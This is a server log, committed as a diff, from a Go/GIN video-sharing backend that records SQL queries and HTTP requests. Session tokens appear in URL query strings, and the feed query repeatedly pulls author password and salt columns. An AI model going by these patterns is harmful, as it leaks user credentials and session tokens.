+[69.856ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 19:25:36 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.681ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 19:25:36 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:23
+[147.656ms] [rows:1] UPDATE `video_t` SET `favorite_count`=favorite_count + 1.000000 WHERE id = 20
+
+2022/05/23 19:25:36 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:30
+[151.708ms] [rows:1] INSERT INTO `favorite_video_t` (`user_id`,`video_id`,`favorite_time`) VALUES (8,20,'2022-05-23 19:25:36.471')
+[GIN] 2022/05/23 - 19:25:36 | 200 |  439.313546ms |    116.169.2.33 | POST     "/douyin/favorite/action/?token=889871ff7dd0423b970e2e98b619bba9&video_id=20&action_type=1"
+[GIN] 2022/05/23 - 19:25:39 | 206 | 25.466006989s |    116.169.2.33 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+[GIN] 2022/05/23 - 19:25:40 | 206 |   940.09603ms |    116.169.2.33 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653305153223&token=670d967604524f50badca9e452404ad6
+
+2022/05/23 19:25:53 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[35.322ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/23 - 19:25:53 | 200 |   35.451346ms |    116.169.3.86 | GET      "/douyin/feed/?latest_time=1653305153223&token=670d967604524f50badca9e452404ad6"
+
+2022/05/23 19:25:54 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.912ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '670d967604524f50badca9e452404ad6'
+
+2022/05/23 19:25:54 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[72.249ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '670d967604524f50badca9e452404ad6'
+
+2022/05/23 19:25:54 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.313ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10
+
+2022/05/23 19:25:54 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:35
+[69.723ms] [rows:3] SELECT * FROM `video_t` WHERE author_id = 10 ORDER BY create_time desc
+
+2022/05/23 19:25:54 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[72.031ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10
+
+2022/05/23 19:25:54 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:44
+[69.740ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10 ORDER BY `user_t`.`user_id` LIMIT 1
+
+2022/05/23 19:25:54 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[71.918ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE user_id = 10
+
+2022/05/23 19:25:54 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[70.064ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 21 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+
+2022/05/23 19:25:54 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[71.957ms] [rows:0] SELECT * FROM `video_t` WHERE id in (NULL)
+[GIN] 2022/05/23 - 19:25:54 | 200 |  288.570164ms |    116.169.3.86 | GET      "/douyin/favorite/list/?token=670d967604524f50badca9e452404ad6&user_id=10"
+
+2022/05/23 19:25:54 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[69.438ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 20 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+
+2022/05/23 19:25:54 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[69.730ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 19 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+[GIN] 2022/05/23 - 19:25:54 | 200 |  488.729949ms |    116.169.3.86 | GET      "/douyin/publish/list/?token=670d967604524f50badca9e452404ad6&user_id=10"
+[GIN] 2022/05/23 - 19:25:54 | 200 |  560.056923ms |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:25:55 | 206 |   940.20169ms |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:25:55 | 206 |  261.954357ms |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:25:57 | 206 |  1.303723849s |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+
+2022/05/23 19:25:57 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[77.390ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '670d967604524f50badca9e452404ad6'
+
+2022/05/23 19:25:57 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[72.272ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '670d967604524f50badca9e452404ad6'
+
+2022/05/23 19:25:57 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[75.863ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10
+
+2022/05/23 19:25:57 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[73.487ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10
+
+2022/05/23 19:25:57 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:35
+[70.025ms] [rows:3] SELECT * FROM `video_t` WHERE author_id = 10 ORDER BY create_time desc
+
+2022/05/23 19:25:57 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[72.130ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE user_id = 10
+
+2022/05/23 19:25:57 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:44
+[70.110ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10 ORDER BY `user_t`.`user_id` LIMIT 1
+
+2022/05/23 19:25:57 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[72.032ms] [rows:0] SELECT * FROM `video_t` WHERE id in (NULL)
+[GIN] 2022/05/23 - 19:25:57 | 200 |  290.429929ms |    116.169.3.86 | GET      "/douyin/favorite/list/?token=670d967604524f50badca9e452404ad6&user_id=10"
+
+2022/05/23 19:25:57 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[69.701ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 21 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+
+2022/05/23 19:25:58 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[384.333ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 20 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+
+2022/05/23 19:25:58 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[69.869ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 19 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+[GIN] 2022/05/23 - 19:25:58 | 200 |  818.252425ms |    116.169.3.86 | GET      "/douyin/publish/list/?token=670d967604524f50badca9e452404ad6&user_id=10"
+
+2022/05/23 19:25:58 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.971ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '670d967604524f50badca9e452404ad6'
+
+2022/05/23 19:25:58 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[72.063ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '670d967604524f50badca9e452404ad6'
+[GIN] 2022/05/23 - 19:25:58 | 200 |  1.173636761s |    116.169.3.86 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+
+2022/05/23 19:25:58 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.555ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10
+
+2022/05/23 19:25:58 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[71.909ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10
+
+2022/05/23 19:25:58 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[69.524ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE user_id = 10
+
+2022/05/23 19:25:58 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:35
+[72.071ms] [rows:3] SELECT * FROM `video_t` WHERE author_id = 10 ORDER BY create_time desc
+
+2022/05/23 19:25:58 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[69.603ms] [rows:0] SELECT * FROM `video_t` WHERE id in (NULL)
+[GIN] 2022/05/23 - 19:25:58 | 200 |  279.099044ms |    116.169.3.86 | GET      "/douyin/favorite/list/?token=670d967604524f50badca9e452404ad6&user_id=10"
+
+2022/05/23 19:25:58 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:44
+[72.021ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10 ORDER BY `user_t`.`user_id` LIMIT 1
+
+2022/05/23 19:25:58 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[72.102ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 21 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+
+2022/05/23 19:25:58 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[72.164ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 20 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+
+2022/05/23 19:25:58 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[72.206ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 19 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+[GIN] 2022/05/23 - 19:25:58 | 200 |  505.290248ms |    116.169.3.86 | GET      "/douyin/publish/list/?token=670d967604524f50badca9e452404ad6&user_id=10"
+[GIN] 2022/05/23 - 19:25:59 | 200 |  855.996036ms |    116.169.3.86 | GET      "/static/10_1653225565_VID_20220504_201616.mp4"
+[GIN] 2022/05/23 - 19:26:00 | 206 |  801.024112ms |    116.169.3.86 | GET      "/static/10_1653225565_VID_20220504_201616.mp4"
+[GIN] 2022/05/23 - 19:26:00 | 206 |  226.026085ms |    116.169.3.86 | GET      "/static/10_1653225565_VID_20220504_201616.mp4"
+[GIN] 2022/05/23 - 19:26:01 | 206 |  522.361761ms |    116.169.3.86 | GET      "/static/10_1653225565_VID_20220504_201616.mp4"
+
+2022/05/23 19:26:01 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[72.151ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '670d967604524f50badca9e452404ad6'
+
+2022/05/23 19:26:01 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.702ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '670d967604524f50badca9e452404ad6'
+
+2022/05/23 19:26:01 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[72.171ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10
+
+2022/05/23 19:26:01 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.508ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10
+
+2022/05/23 19:26:01 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:35
+[72.181ms] [rows:3] SELECT * FROM `video_t` WHERE author_id = 10 ORDER BY create_time desc
+
+2022/05/23 19:26:01 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[69.740ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE user_id = 10
+
+2022/05/23 19:26:01 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:44
+[72.142ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10 ORDER BY `user_t`.`user_id` LIMIT 1
+
+2022/05/23 19:26:01 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[69.361ms] [rows:0] SELECT * FROM `video_t` WHERE id in (NULL)
+[GIN] 2022/05/23 - 19:26:01 | 200 |  278.869577ms |    116.169.3.86 | GET      "/douyin/favorite/list/?token=670d967604524f50badca9e452404ad6&user_id=10"
+
+2022/05/23 19:26:01 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[72.051ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 21 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+
+2022/05/23 19:26:01 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[72.313ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 20 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+
+2022/05/23 19:26:01 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[72.210ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 19 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+[GIN] 2022/05/23 - 19:26:01 | 200 |  506.078554ms |    116.169.3.86 | GET      "/douyin/publish/list/?token=670d967604524f50badca9e452404ad6&user_id=10"
+[GIN] 2022/05/23 - 19:26:01 | 200 |  568.107358ms |    116.169.3.86 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+[GIN] 2022/05/23 - 19:26:02 | 206 |  322.111525ms |    116.169.3.86 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+
+2022/05/23 19:26:03 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.793ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '670d967604524f50badca9e452404ad6'
+
+2022/05/23 19:26:03 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[72.139ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '670d967604524f50badca9e452404ad6'
+[GIN] 2022/05/23 - 19:26:03 | 206 |  117.755716ms |    116.169.3.86 | GET      "/static/10_1653225603_VID_20220504_201616.mp4"
+
+2022/05/23 19:26:03 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.554ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10
+
+2022/05/23 19:26:03 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[71.899ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10
+
+2022/05/23 19:26:03 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[69.615ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE user_id = 10
+
+2022/05/23 19:26:03 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:35
+[72.053ms] [rows:3] SELECT * FROM `video_t` WHERE author_id = 10 ORDER BY create_time desc
+
+2022/05/23 19:26:03 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[69.727ms] [rows:0] SELECT * FROM `video_t` WHERE id in (NULL)
+[GIN] 2022/05/23 - 19:26:03 | 200 |   279.26515ms |    116.169.3.86 | GET      "/douyin/favorite/list/?token=670d967604524f50badca9e452404ad6&user_id=10"
+
+2022/05/23 19:26:03 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:44
+[73.014ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10 ORDER BY `user_t`.`user_id` LIMIT 1
+
+2022/05/23 19:26:03 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[72.070ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 21 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+
+2022/05/23 19:26:03 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[71.986ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 20 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+
+2022/05/23 19:26:03 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[72.166ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 19 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+[GIN] 2022/05/23 - 19:26:03 | 200 |  506.123562ms |    116.169.3.86 | GET      "/douyin/publish/list/?token=670d967604524f50badca9e452404ad6&user_id=10"
+[GIN] 2022/05/23 - 19:26:04 | 200 |  1.068221315s |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:26:04 | 206 |   632.11551ms |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:26:05 | 206 |  188.641057ms |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653305165191&token=670d967604524f50badca9e452404ad6
+
+2022/05/23 19:26:05 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[36.467ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/23 - 19:26:05 | 200 |   36.609814ms |    116.169.3.86 | GET      "/douyin/feed/?latest_time=1653305165191&token=670d967604524f50badca9e452404ad6"
+[GIN] 2022/05/23 - 19:26:05 | 206 |  629.619454ms |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+
+2022/05/23 19:26:06 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[72.106ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '670d967604524f50badca9e452404ad6'
+
+2022/05/23 19:26:06 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[70.018ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '670d967604524f50badca9e452404ad6'
+
+2022/05/23 19:26:06 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[72.014ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10
+
+2022/05/23 19:26:06 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.826ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10
+
+2022/05/23 19:26:06 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:35
+[72.390ms] [rows:3] SELECT * FROM `video_t` WHERE author_id = 10 ORDER BY create_time desc
+
+2022/05/23 19:26:06 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[69.431ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE user_id = 10
+
+2022/05/23 19:26:06 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[69.742ms] [rows:0] SELECT * FROM `video_t` WHERE id in (NULL)
+[GIN] 2022/05/23 - 19:26:06 | 200 |  279.564007ms |    116.169.3.86 | GET      "/douyin/favorite/list/?token=670d967604524f50badca9e452404ad6&user_id=10"
+
+2022/05/23 19:26:06 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:44
+[71.893ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 10 ORDER BY `user_t`.`user_id` LIMIT 1
+
+2022/05/23 19:26:06 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[72.089ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 21 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+
+2022/05/23 19:26:06 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[72.182ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 20 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+
+2022/05/23 19:26:06 /home/douyin/douyin/douyin-v1.0.7/dao/saveAndGetVideo.go:53 record not found
+[72.269ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE video_id = 19 AND user_id = 10 ORDER BY `favorite_video_t`.`id` LIMIT 1
+[GIN] 2022/05/23 - 19:26:06 | 200 |  505.688148ms |    116.169.3.86 | GET      "/douyin/publish/list/?token=670d967604524f50badca9e452404ad6&user_id=10"
+[GIN] 2022/05/23 - 19:26:06 | 200 |  494.348164ms |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:26:07 | 206 |  833.692863ms |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:26:08 | 206 |  210.225007ms |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:26:10 | 206 |  1.904309267s |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:26:11 | 206 |  1.018204673s |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:26:11 | 206 |  738.857658ms |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:26:13 | 206 |  1.280465353s |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:26:14 | 206 |  927.816222ms |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:26:14 | 206 |  717.289838ms |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:26:16 | 206 |  1.536626976s |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:26:17 | 206 |  727.756206ms |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:26:18 | 206 |  1.173914412s |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:26:27 | 206 |  9.306173761s |    116.169.3.86 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 19:40:43 | 200 |        15m47s | 183.222.204.209 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 20:15:58 | 404 |         577ns |    124.89.118.6 | GET      "/"
+[GIN] 2022/05/23 - 20:15:58 | 404 |         952ns |    124.89.118.6 | GET      "/"
+[GIN] 2022/05/23 - 20:16:06 | 404 |         894ns |    124.89.118.6 | GET      "/"
+[GIN] 2022/05/23 - 20:16:06 | 404 |         446ns |    124.89.118.6 | GET      "/"
+[GIN] 2022/05/23 - 20:16:06 | 404 |         451ns |    124.89.118.6 | GET      "/"
+[GIN] 2022/05/23 - 20:16:12 | 404 |       2.026µs |    124.89.118.6 | GET      "/"
+[GIN] 2022/05/23 - 20:16:12 | 404 |       1.238µs |    124.89.118.6 | GET      "/"
+[GIN] 2022/05/23 - 20:16:12 | 404 |         810ns |    124.89.118.6 | GET      "/"
+[GIN] 2022/05/23 - 20:16:12 | 404 |       1.083µs |    124.89.118.6 | CONNECT  ""
+[GIN] 2022/05/23 - 21:35:39 | 404 |         836ns |     193.124.7.9 | GET      "/"
+[GIN] 2022/05/23 - 21:36:51 | 404 |         643ns |     65.49.20.69 | GET      "/"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653313452051&token=fc6ed18dbb0943aa991287ef68d4633f
+
+2022/05/23 21:44:11 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[36.474ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/23 - 21:44:11 | 200 |   36.623857ms |    116.169.2.33 | GET      "/douyin/feed/?latest_time=1653313452051&token=fc6ed18dbb0943aa991287ef68d4633f"
+
+2022/05/23 21:44:11 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[72.249ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = 'fc6ed18dbb0943aa991287ef68d4633f'
+[GIN] 2022/05/23 - 21:44:11 | 200 |     323.064µs |    116.169.2.33 | GET      "/static/cover/10_1653225616_cover.jpg"
+[GIN] 2022/05/23 - 21:44:11 | 200 |     388.895µs |    116.169.2.33 | GET      "/static/cover/10_1653225603_cover.jpg"
+
+2022/05/23 21:44:11 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[71.962ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 3
+
+2022/05/23 21:44:11 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.535ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = 'fc6ed18dbb0943aa991287ef68d4633f'
+
+2022/05/23 21:44:11 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[71.960ms] [rows:0] SELECT * FROM `favorite_video_t` WHERE user_id = 3
+
+2022/05/23 21:44:11 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.489ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 3
+[GIN] 2022/05/23 - 21:44:11 | 200 |   139.26232ms |    116.169.2.33 | GET      "/douyin/publish/list/?token=fc6ed18dbb0943aa991287ef68d4633f&user_id=10"
+
+2022/05/23 21:44:11 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[71.948ms] [rows:0] SELECT * FROM `video_t` WHERE id in (NULL)
+[GIN] 2022/05/23 - 21:44:11 | 200 |  288.509457ms |    116.169.2.33 | GET      "/douyin/favorite/list/?token=fc6ed18dbb0943aa991287ef68d4633f&user_id=10"
+[GIN] 2022/05/23 - 21:44:12 | 200 |   1.08417722s |    116.169.2.33 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 21:44:12 | 206 |  436.751748ms |    116.169.2.33 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 21:44:13 | 206 |  451.977752ms |    116.169.2.33 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 21:44:17 | 206 |  3.660054041s |    116.169.2.33 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 22:18:48 | 404 |         476ns |     83.97.20.34 | GET      "/"
+[GIN] 2022/05/23 - 22:54:22 | 200 |  963.310919ms |  112.44.121.136 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 22:54:23 | 206 |  1.022559673s |  112.44.121.136 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 22:54:23 | 206 |  137.598153ms |  112.44.121.136 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 22:54:24 | 200 |  177.295108ms |  112.44.121.136 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
